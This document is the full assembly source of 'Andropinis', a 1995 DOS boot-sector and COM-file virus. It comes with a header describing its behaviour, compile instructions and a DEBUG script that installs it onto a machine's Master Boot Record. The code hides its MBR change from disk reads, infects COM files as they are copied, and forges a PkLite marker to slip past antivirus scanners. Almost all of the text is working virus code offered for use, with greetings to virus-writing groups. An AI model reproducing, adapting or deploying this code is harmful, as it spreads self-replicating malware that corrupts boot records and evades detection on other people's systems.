;******************************************************************************
;
; Virus name    : Andropinis
; Author        : Rajaat
; Origin        : United Kingdom, March 1995
; Compiling     : Using TASM            | Using A86
;                                       |
;                 TASM /M2 ANDROPIN.ASM | A86 ANDROPIN.ASM
;                 TLINK ANDROPIN        |
;                 EXE2BIN ANDROPIN      |
; Installing    : Place the produced BIN file at cylinder 0, head 0, sector 2
;                 Modify the partition record to point to this code
;                 (a debug script is provided at the end of this source)
; Targets       : Master Boot Record & COM files
; Size          : 512 bytes
; Polymorphic   : No
; Encrypted     : No
; Stealth       : Full Stealth on Master Boot Record
; Tunneling     : No - is not needed if started from Master boot record
; Retrovirus    : No
; Antiheuristics: Yes - for TBAV
; Peculiarities : Infects MBR by modifying 2 bytes
;                 Uses SFT's to infect COM files
;                 Avoids Thunderbyte Antivirus using a 2 byte signature!
; Behaviour     : When an infected COM file is run, the virus will not become
;                 resident, but will first infect the master boot record. It
;                 does its work in a very peculiar way. It modifies the
;                 1st partition record with the result that it points to
;                 cylinder 0, head 0, sector 2. The viral bootsector will be
;                 stored there. The next time when a system is booted,
;                 Andropinis will become resident in high memory, but below
;                 the top of memory. Programs like CHKDSK.EXE will show a
;                 decrease in system memory of 1024 bytes. The virus will hook
;                 interrupt 13 at this time and wait till interrupt 21 is
;                 captured 3 times. Andropinis will then take interrupt 21
;                 itself. The virus is now stealth on the master boot record,
;                 only modifying the pointer to the bootsector in memory when
;                 the master boot record is read. The virus will infect COM
;                 files when copied, therefore not needing a critical interrupt
;                 handler. Andropinis will only infect COM files when they are
;                 between 4095 and 61441 bytes. Infected files will begin with
;                 a PUSH AX, DEC BX, NOP and a near jump to the virus code.
;                 The first 2 instructions will cause the Thunderbyte scanner
;                 to avoid the file. It thinks it's processed with PkLite! f
;                 Even the "ex"tract option doesn't work and gives back a "N/A"
;                 for every infected file. F-PROT detects nothing, except when
;                 the /ANALYSE option is used. AVP gives a virus "Type Boot"
;                 suspicion. How true that is. The weak point of the virus is
;                 its lack of protection in infected COM files, so it relies on
;                 the fact that the Master Boot Record infection isn't visible.
;                 Tai-Pan spread also far, and was even more simplistic than
;                 Andropinis, with the exception that is infected the more
;                 common filetype, the EXE file. The virus doesn't do any
;                 intended harm, as Patty would say :
;                 "It's unknown what this virus does besides replicate."
; Yoho's        : VLAD, Immortal Riot, Phalcon/Skism, [NuKE],
;                 and all other virus writers that exist.
;
;******************************************************************************

.model tiny                                     ; this must become a BIN file

.code                                           ; let's start with the code, ok

.radix 16                                       ; safe hex

                org 0                           ; throw it in the bin

;******************************************************************************
; Viral boot sector
;******************************************************************************

virus:          xor bx,bx                       ; initialise stack and data
                cli                             ; segment
                mov ss,bx                       ;
                mov ds,bx                       ;
                mov sp,7c00                     ;
                push sp                         ;
                sti                             ;

                mov si,413                      ; steal some memory from the
                dec word ptr [si]               ; top
                lodsw                           ;

                mov cl,6                        ; calculate free segment for
                shl ax,cl                       ; virus
                mov es,ax                       ;

                pop si
                mov di,bx                       ; push data for a far jump to
                push di                         ; the virus code in high memory
                push es                         ;
                lea ax,init_resident            ;
                push ax                         ;

                mov cx,100                      ; move the code to high memory
move_boot:      movsw                           ; this doesn't trigger tbav
                loop move_boot                  ;

                retf                            ; return to the address pushed

;******************************************************************************
; the following piece of code is executed in high memory
;******************************************************************************

init_resident:  mov byte ptr cs:hook_21_flag,0  ; reset int 21 hook flag

                lea di,old_13                   ; store old int 13 vector and
                mov si,4*13                     ; replace it with our new
                lea ax,new_13                   ; handler
                xchg ax,[si]                    ;
                stosw                           ;
                mov ax,cs                       ;
                xchg ax,[si+2]                  ;
                stosw                           ;

                mov si,4*21                     ; store new address to int 21
                lea ax,new_21                   ; vector
                xchg ax,[si]                    ;
                mov ax,cs                       ;
                xchg ax,[si+2]                  ;

                pop es                          ; read the original bootsector
                push es                         ; and execute it
                mov ax,0201                     ;
                mov dx,180                      ;
                mov cx,1                        ;
                mov bx,7c00                     ;
                push bx                         ;
                int 13h                         ;
                retf                            ;

;******************************************************************************
; new int 13 handler
;******************************************************************************

new_13:         cmp ax,5001                     ; installation check
                jne no_inst_check               ;
                xchg ah,al                      ;
                iret

no_inst_check:  cmp ah,2                        ; check if partition sector
                jne no_stealth                  ; is read. if not, there's
                cmp dx,80                       ; no need to use stealth
                jne no_stealth                  ;
                cmp cx,1                        ;
                jne no_stealth                  ;

                pushf                           ; perform read action, and
                call dword ptr cs:[old_13]      ; go to stealth_mbr if no error
                jnc stealth_mbr                 ; occured
                retf 2                          ;

stealth_mbr:    cmp word ptr es:1bf[bx],200     ; is the virus active?
                jne not_infected                ; no, goto not_infected
                mov word ptr es:1bf[bx],0101    ; stealth virus
not_infected:   iret                            ;

no_stealth:     cmp byte ptr cs:[hook_21_flag],3; if this is try 3 to get int
                je eoi_13                       ; 21, get lost to eoi_13

                push ax                         ; preserve these
                push ds                         ;

                xor ax,ax                       ; is int 21 changed?
                mov ds,ax                       ;
                mov ax,cs                       ;
                cmp ax,word ptr ds:[4*21+2]     ;
                je int_21_ok                    ; no, int 21 is ok

                inc byte ptr cs:[hook_21_flag]  ; increase the hook int 21 flag

                lea ax,new_21                   ; capture int 21 and store
                xchg ax,ds:[4*21]               ; the old vector
                mov word ptr cs:old_21,ax       ;
                mov ax,cs                       ;
                xchg ax,ds:[4*21+2]             ;
                mov word ptr cs:old_21[2],ax    ;

int_21_ok:      pop ds                          ; get these back
                pop ax                          ;

eoi_13:         jmp dword ptr cs:[old_13]       ; chain to old int 13

;******************************************************************************
; new int 21 handler
;******************************************************************************

new_21:         cmp ah,40                       ; is a write command performed?
                je write_to_file                ; yeah, write_to_file

eoi_21:         jmp dword ptr cs:[old_21]       ; chain to old int 21

write_to_file:  push ax                         ; preserve some registers
                push bx                         ;
                push dx                         ;
                push di                         ;
                push es                         ;

                mov ax,4400                     ; check if the write belongs
                int 21                          ; to a device
                test dl,80                      ;
                jnz not_suitable                ;

                mov ax,1220                     ; find file handle table that
                int 2f                          ; belongs to the handle in bx
                mov bl,byte ptr es:[di]         ;
                mov ax,1216                     ;
                int 2f                          ;

                mov bx,2020                     ; check if the file has a com
                mov ax,word ptr es:[di+28]      ; extension
                or ax,bx                        ;
                cmp ax,'oc'                     ;
                jne not_suitable                ;
                mov al,byte ptr es:[di+2a]      ;
                or al,bl                        ;
                cmp al,'m'                      ;
                jne not_suitable                ;

                cmp word ptr es:[di+11],0       ; check if file length is
                jne not_suitable                ; zero

                cmp cx,1000                     ; check if piece of code is
                jb not_suitable                 ; not too short or too long
                cmp cx,0f000                    ;
                ja not_suitable                 ;

                pop es                          ; these registers are done
                pop di                          ;
                pop dx                          ;

                mov bx,dx                       ; check if the file is a
                cmp word ptr ds:[bx],'ZM'       ; renamed exe file
                je is_renamed_exe               ;

                cmp word ptr ds:[bx+2],0e990    ; check if already infected
                jne infect_com                  ;
                jmp is_renamed_exe

not_suitable:   pop es                          ; done with this interrupt
                pop di                          ; service routine, so chain
                pop dx                          ; to the old 21 routine
is_renamed_exe: pop bx                          ;
                pop ax                          ;
                jmp eoi_21                      ;

;******************************************************************************
; piece of code that infects a COM file
;******************************************************************************

infect_com:     pop bx                          ; this register was done

                push cx                         ; get the first 6 bytes of the
                push si                         ; host and overwrite them with
                add cx,offset com_entry-6       ; the new bytes. it places a
                mov si,dx                       ; nifty piece of code to
                mov ax,'KP'                     ; render tbscans heuristics
                xchg word ptr [si],ax           ; useless. the PUSH AX, DEC BX
                mov word ptr cs:org_com,ax      ; (PK) in the begin of the
                lodsw                           ; program makes tbscan think
                mov ax,0e990                    ; it is a PkLite compressed
                xchg word ptr ds:[si],ax        ; file and will skip it!
                mov word ptr cs:org_com+2,ax    ;
                lodsw                           ;
                xchg word ptr ds:[si],cx        ;
                mov word ptr cs:org_com+4,cx    ;
                pop si                          ;
                pop cx                          ;

                pop ax                          ; perform original write
                pushf                           ; command
                call dword ptr cs:[old_21]      ;

                push ax                         ; and append the virus at the
                push cx                         ; end of the file
                push dx                         ;
                push ds                         ;
                push cs                         ;
                pop ds                          ;
                mov ah,40                       ;
                mov cx,virus_length_b           ;
                lea dx,virus                    ;
                pushf                           ;
                call dword ptr cs:[old_21]      ;
                pop ds                          ;
                pop dx                          ;
                pop cx                          ;
                pop ax                          ;
                retf 2                          ;

;******************************************************************************
; this gets executed by an infected COM file
;******************************************************************************

com_entry:      call get_offset                 ; old hat for getting the
get_offset:     pop bp                          ; delta offset
                sub bp,offset get_offset        ;

                mov ax,5001                     ; if the virus is resident it
                int 13                          ; doesn't need to infect the
                cmp ax,0150                     ; master boot record
                je is_active                    ;

                mov ax,0201                     ; read master boot record.
                lea bx,heap[bp]                 ; if an error occured, goto
                mov cx,1                        ; is_active
                mov dx,80                       ;
                int 13                          ;
                jc is_active                    ;

                cmp word ptr [bx+1be+1],0101    ; test if the partition begins
                jne is_active                   ; at the normal sector

                test byte ptr [bx+1be],80       ; test of the partition is
                jz is_active                    ; bootable

                mov al,byte ptr [bx+1be+4]      ; test if the partition type
                cmp al,4                        ; is ok
                jb is_active                    ;
                cmp al,6                        ;
                ja is_active                    ;

                mov word ptr [bx+1be+1],200     ; change pointer to virus code

                mov ax,0301                     ; write back the master boot
                push ax                         ; record. quit if error
                int 13                          ; occured
                pop ax                          ;
                jc is_active                    ;

                inc cx                          ; write virus to sector 2
                lea bx,virus[bp]                ; (right behind the mbr)
                int 13                          ;

is_active:      lea si,org_com[bp]              ; restore beginning of the
                mov di,100                      ; host and execute it
                pop ax                          ;
                push cs                         ;
                push di                         ;
                movsw                           ;
                movsw                           ;
                movsw                           ;
                retf                            ;

;******************************************************************************
; some data used by the virus
;******************************************************************************

                db '[Andropinis]'               ; my childs name
                db ' by Rajaat',0               ; my name

                org 1fe                         ; for the bootsector

                db 55,0aa                       ; boot signature

;******************************************************************************
; the things below aren't copied into the viral boot sector, only in COM files
;******************************************************************************

org_com         equ $                           ; original program data

heap            equ $+6                         ; memory for data

virus_length_b  equ heap-virus                  ; who says size doesn't count?
virus_length_s  equ (virus_length_b+1ff) / 200  ;
virus_length_k  equ (virus_length_b+3ff) / 400  ;

old_13          equ heap+6                      ; old int 13 vector
old_21          equ heap+0a                     ; old int 21 vector
hook_21_flag    equ heap+0e                     ; int 21 hook flag

end virus                                       ; the end complete
end                                             ;
;******************************************************************************

; remove the piece below if you use A86 instead of TASM, because it will
; choke on it

        --- debug script for installing the Andropinis virus ---

install with
DEBUG ANDROPIN.BIN < scriptname
where scriptname is the name that you give to the mess below

                            --- cut here ---
m 100 l200 1000
a
mov ax,0201
mov bx,800
mov cx,1
mov dx,80
int 13
mov si,9bf
mov word ptr [si],200
mov ax,0301
mov dx,80
int 13
mov ax,0301
mov bx,1000
inc cx
int 13
int 20

g
q
                            --- cut here ---

